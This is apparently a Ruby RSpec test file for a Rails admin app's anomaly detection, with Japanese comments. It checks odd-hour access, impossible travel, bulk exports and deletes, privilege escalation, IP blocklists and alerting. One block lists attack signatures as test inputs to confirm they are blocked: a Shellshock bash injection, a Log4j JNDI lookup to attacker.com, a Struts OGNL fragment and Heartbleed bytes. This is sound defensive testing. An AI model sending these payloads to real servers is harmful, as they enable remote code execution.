# frozen_string_literal: true

require 'rails_helper'

# Phase 5-5: 異常検知システムテスト
# ============================================
# 機械学習ベースの異常検知機能テスト
# セキュリティパターン分析と脅威検出
# ============================================
RSpec.describe "Anomaly Detection System", type: :request do
  let(:admin) { create(:admin) }
  let(:store) { create(:store) }
  let(:store_user) { create(:store_user, store: store) }
  
  # ============================================
  # 異常アクセスパターン検出
  # ============================================
  describe "異常アクセスパターンの検出" do
    before do
      # 正常なアクセスパターンの学習データ
      create_normal_access_patterns
    end
    
    context "時間帯異常" do
      it "通常と異なる時間帯のアクセスを検出すること" do
        # 深夜3時のアクセス（通常は9-18時）
        travel_to Time.zone.parse("2025-01-15 03:00:00") do
          sign_in admin
          get admin_inventories_path
          
          # 異常として記録されること
          anomaly_log = AuditLog.where(
            action: "security_event",
            created_at: 1.minute.ago..Time.current
          ).last
          
          expect(anomaly_log).to be_present
          expect(anomaly_log.message).to include("異常な時間帯のアクセス")
        end
      end
    end
    
    context "地理的異常" do
      it "異なる地域からの同時アクセスを検出すること" do
        # 東京からのアクセス
        allow_any_instance_of(ActionDispatch::Request).to receive(:remote_ip).and_return("203.0.113.1")
        allow_any_instance_of(ActionDispatch::Request).to receive(:location).and_return(
          OpenStruct.new(country: "JP", city: "Tokyo")
        )
        
        sign_in admin
        get admin_inventories_path
        
        # 5分後にニューヨークからアクセス（物理的に不可能）
        travel_to 5.minutes.from_now do
          allow_any_instance_of(ActionDispatch::Request).to receive(:remote_ip).and_return("198.51.100.1")
          allow_any_instance_of(ActionDispatch::Request).to receive(:location).and_return(
            OpenStruct.new(country: "US", city: "New York")
          )
          
          get admin_stores_path
          
          # 地理的異常として検出
          expect(AuditLog.where(
            action: "security_event",
            message: /地理的に不可能な移動/
          ).count).to be > 0
        end
      end
    end
    
    context "アクセス頻度異常" do
      it "通常と異なる高頻度アクセスを検出すること" do
        sign_in admin
        
        # 1秒間に50回のアクセス（通常は1分に5回程度）
        suspicious_activity = false
        
        50.times do |i|
          get admin_inventories_path
          
          # 異常検知されたかチェック
          if response.status == 429 || flash[:alert]&.include?("異常なアクセスパターン")
            suspicious_activity = true
            break
          end
        end
        
        expect(suspicious_activity).to be true
      end
    end
  end
  
  # ============================================
  # 異常操作パターン検出
  # ============================================
  describe "異常操作パターンの検出" do
    before do
      sign_in admin
    end
    
    context "データアクセスパターン" do
      it "通常と異なる大量データアクセスを検出すること" do
        # 通常は10件程度のアクセスのところ、1000件アクセス
        inventories = create_list(:inventory, 1000)
        
        # 短時間での大量アクセス
        access_count = 0
        detected = false
        
        inventories.first(100).each do |inventory|
          get admin_inventory_path(inventory)
          access_count += 1
          
          # 異常検知チェック
          if AuditLog.where(
            action: "security_event",
            message: /大量データアクセス/,
            created_at: 1.minute.ago..Time.current
          ).exists?
            detected = true
            break
          end
        end
        
        expect(detected).to be true
        expect(access_count).to be < 100 # 100件未満で検出される
      end
    end
    
    context "権限エスカレーション試行" do
      it "権限昇格の試行を検出すること" do
        regular_admin = create(:admin, role: "admin")
        sign_in regular_admin
        
        # 複数の管理者機能へのアクセス試行
        escalation_attempts = 0
        
        # スーパー管理者限定機能へのアクセス
        privileged_paths = [
          admin_system_settings_path,
          admin_security_settings_path,
          admin_user_roles_path
        ]
        
        privileged_paths.each do |path|
          get path rescue nil
          escalation_attempts += 1
        end
        
        # 権限エスカレーション試行として記録
        security_event = AuditLog.where(
          action: "security_event",
          message: /権限エスカレーション試行/,
          created_at: 1.minute.ago..Time.current
        ).last
        
        expect(security_event).to be_present
        expect(JSON.parse(security_event.details)["attempts"]).to eq(escalation_attempts)
      end
    end
    
    context "データ漏洩パターン" do
      it "大量データエクスポートを検出すること" do
        # CSVエクスポートの連続実行
        export_count = 0
        
        5.times do
          get admin_inventories_path(format: :csv)
          export_count += 1
          
          get admin_stores_path(format: :csv)
          export_count += 1
        end
        
        # データ漏洩リスクとして検出
        expect(AuditLog.where(
          action: "security_event",
          message: /大量データエクスポート/,
          severity: "high"
        ).count).to be > 0
      end
    end
  end
  
  # ============================================
  # 行動ベースライン分析
  # ============================================
  describe "ユーザー行動ベースライン分析" do
    before do
      # 30日間の正常な行動パターンを生成
      create_user_baseline_behavior(admin)
    end
    
    it "ベースラインから逸脱した行動を検出すること" do
      sign_in admin
      
      # 通常と異なる操作順序
      # 通常: ダッシュボード → 在庫一覧 → 詳細
      # 異常: 直接複数の詳細ページアクセス
      inventories = create_list(:inventory, 20)
      
      inventories.each do |inventory|
        delete admin_inventory_path(inventory)
      end
      
      # 短時間での大量削除として検出
      anomaly = AuditLog.where(
        action: "security_event",
        message: /異常な削除パターン/
      ).last
      
      expect(anomaly).to be_present
      expect(anomaly.severity).to eq("high")
    end
    
    it "マウス動作の異常を検出すること" do
      # JavaScriptでマウス動作を記録（実装依存）
      post admin_track_behavior_path, params: {
        behavior: {
          mouse_movements: 0, # ボットの可能性
          click_intervals: [100, 100, 100, 100], # 一定間隔
          typing_speed: 1000 # 異常に速い
        }
      }
      
      # ボット行動として検出
      expect(response).to have_http_status(:forbidden)
    end
  end
  
  # ============================================
  # 脅威インテリジェンス統合
  # ============================================
  describe "脅威インテリジェンスとの連携" do
    context "既知の悪意あるIPアドレス" do
      it "ブラックリストIPからのアクセスをブロックすること" do
        # 既知の悪意あるIP（テスト用）
        malicious_ips = [
          "192.0.2.1",    # TEST-NET-1
          "198.51.100.1", # TEST-NET-2
          "203.0.113.1"   # TEST-NET-3
        ]
        
        malicious_ips.each do |ip|
          allow_any_instance_of(ActionDispatch::Request).to receive(:remote_ip).and_return(ip)
          
          get root_path
          
          expect(response).to have_http_status(:forbidden)
          expect(response.body).to include("Access Denied")
        end
      end
    end
    
    context "既知の攻撃パターン" do
      # 既知の攻撃シグネチャ
      ATTACK_SIGNATURES = {
        shellshock: "() { :; }; /bin/bash -c 'echo vulnerable'",
        log4j: "${jndi:ldap://attacker.com/exploit}",
        struts: "%{(#_='multipart/form-data')}",
        heartbleed: "\x18\x03\x02\x00\x03\x01\x40\x00"
      }.freeze
      
      it "既知の攻撃シグネチャを検出すること" do
        ATTACK_SIGNATURES.each do |attack_type, signature|
          # ヘッダーインジェクション
          get root_path, headers: {
            "User-Agent" => signature,
            "X-Custom" => signature
          }
          
          # 攻撃として検出・ブロック
          expect([403, 400]).to include(response.status)
          
          # セキュリティイベントとして記録
          expect(AuditLog.where(
            action: "security_event",
            message: /攻撃シグネチャ検出.*#{attack_type}/i
          ).count).to be > 0
        end
      end
    end
  end
  
  # ============================================
  # 機械学習モデルの精度測定
  # ============================================
  describe "異常検知モデルの精度" do
    before do
      # テストデータセットの準備
      @true_positives = 0
      @false_positives = 0
      @true_negatives = 0
      @false_negatives = 0
    end
    
    it "誤検知率が5%以下であること" do
      # 正常なアクセス100件
      100.times do
        sign_in admin
        perform_normal_activity
        
        if detected_as_anomaly?
          @false_positives += 1
        else
          @true_negatives += 1
        end
        
        sign_out admin
      end
      
      false_positive_rate = @false_positives.to_f / (@false_positives + @true_negatives)
      expect(false_positive_rate).to be <= 0.05
    end
    
    it "検出率が95%以上であること" do
      # 異常なアクセス100件
      100.times do
        sign_in admin
        perform_anomalous_activity
        
        if detected_as_anomaly?
          @true_positives += 1
        else
          @false_negatives += 1
        end
        
        sign_out admin
      end
      
      detection_rate = @true_positives.to_f / (@true_positives + @false_negatives)
      expect(detection_rate).to be >= 0.95
    end
  end
  
  # ============================================
  # リアルタイムアラート
  # ============================================
  describe "リアルタイムセキュリティアラート" do
    it "重大な異常検知時に即座にアラートが送信されること" do
      # メール送信のモック
      allow(SecurityAlertMailer).to receive(:critical_anomaly).and_call_original
      
      # 重大な異常を発生させる
      sign_in admin
      
      # 全データの一括削除試行
      Inventory.all.each { |inv| delete admin_inventory_path(inv) }
      
      # アラートメールが送信されること
      expect(SecurityAlertMailer).to have_received(:critical_anomaly).at_least(:once)
    end
    
    it "Slackに通知が送信されること" do
      # Slack通知のモック
      allow(SlackNotifier).to receive(:post)
      
      # セキュリティイベント発生
      5.times do
        post admin_session_path, params: {
          admin: { email: "attacker@example.com", password: "wrong" }
        }
      end
      
      # Slack通知が送信されること
      expect(SlackNotifier).to have_received(:post).with(
        hash_including(text: /セキュリティアラート/)
      )
    end
  end
  
  private
  
  def create_normal_access_patterns
    # 過去30日間の正常なアクセスパターンを生成
    30.times do |i|
      travel_to i.days.ago do
        # 営業時間内のアクセス
        travel_to Time.zone.parse("09:00:00") do
          create(:audit_log, user: admin, action: "view", message: "正常アクセス")
        end
      end
    end
  end
  
  def create_user_baseline_behavior(user)
    # ユーザーの標準的な行動パターンを生成
    30.times do |i|
      travel_to i.days.ago do
        # 典型的な操作順序
        create(:audit_log, user: user, action: "view", auditable_type: "Dashboard")
        create(:audit_log, user: user, action: "index", auditable_type: "Inventory")
        create(:audit_log, user: user, action: "view", auditable_type: "Inventory")
      end
    end
  end
  
  def perform_normal_activity
    get admin_root_path
    get admin_inventories_path
  end
  
  def perform_anomalous_activity
    # 異常な活動パターン
    100.times { get admin_inventories_path }
  end
  
  def detected_as_anomaly?
    AuditLog.where(
      action: "security_event",
      created_at: 1.minute.ago..Time.current
    ).exists?
  end
end

# ============================================
# TODO: Phase 5-6以降の拡張予定
# ============================================
# 1. 🔴 高度な機械学習モデル
#    - ディープラーニングによる異常検知
#    - 教師なし学習の実装
#    - リアルタイム学習機能
#
# 2. 🟡 統合セキュリティダッシュボード
#    - リアルタイム脅威マップ
#    - セキュリティスコアリング
#    - インシデント対応ワークフロー
#
# 3. 🟢 自動対応システム
#    - 自動ブロック機能
#    - 自動パッチ適用
#    - インシデント自動エスカレーション